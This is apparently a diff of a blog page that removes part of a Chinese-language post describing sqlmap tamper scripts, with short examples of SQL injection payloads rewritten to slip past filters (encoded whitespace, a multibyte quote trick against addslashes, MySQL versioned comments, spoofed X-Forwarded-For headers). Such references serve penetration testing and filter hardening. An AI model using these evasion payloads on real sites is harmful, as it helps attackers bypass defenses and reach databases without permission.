-<h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %0E</strong></p>
-<p><strong>Platform: Mssql 2000,2005</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure>
-<h3 id="space2mssqlblank-py-1"><a href="#space2mssqlblank-py-1" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3><p><strong>Function: 空格 ==&gt; %23%0A</strong></p>
-<p><strong>Platform: Mssql、Mysql</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1 ==&gt; 1%23%0AAND%23%0A9227=9227</span><br></pre></td></tr></table></figure>
-<h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3><p><strong>Function: 空格 ==&gt; %2B、%0D、%0C</strong></p>
-<p><strong>Platform: Mysql5.1</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Bid%0DFROM%0Cusers</span><br></pre></td></tr></table></figure>
-<h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3><p><strong>Function: 空格 ==&gt; –%0A</strong></p>
-<p><strong>Platform: Mssql、Mysql</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227 ==&gt; 1--%0AAND--%0A9227=9227</span><br></pre></td></tr></table></figure>
-<h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3><p><strong>Function: 空格 ==&gt; +</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>
-<h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3><p><strong>Function: 空格 ==&gt; %0D、%0A、%0C、%09</strong></p>
-<p><strong>Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</span><br></pre></td></tr></table></figure>
-<h3 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h3><p><strong>Function: and ==&gt; %26%26</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &apos;1&apos;=&apos;1 ==&gt; 1 %26%26 &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
-<h3 id="thinkphp-py"><a href="#thinkphp-py" class="headerlink" title="thinkphp.py"></a>thinkphp.py</h3><p><strong>Platform: Mysql</strong></p>
-<h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3><p><strong>Function: 替换All为空</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL SELECT ==&gt; -1 UNION SELECT</span><br></pre></td></tr></table></figure>
-<h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3><p><strong>Function: ‘ ==&gt; %df%27</strong></p>
-<p><strong>Platform: Mysql magic_quotes/addslashes</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND 1=1 ==&gt; 1%bf%27--</span><br></pre></td></tr></table></figure>
-<h3 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h3><p><strong>Function: 小写转大写</strong></p>
-<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert ==&gt; INSERT</span><br></pre></td></tr></table></figure>
-<h3 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h3><p><strong>Function: header头</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
-<h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
-<p><strong>Platform: MySQL 4.0.18, 5.1.56, 5.5.11</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
-<h3 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
-<p><strong>Platform: MySQL 5.1.56, 5.5.11</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
-<h3 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h3><p><strong>Function: X-Forwarded-For随机头</strong></p>
-<p><strong>Platform: All</strong></p>
-<blockquote>
-<p>example</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2092,7 +1828,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">70</span>
+              <span class="site-state-item-count">71</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
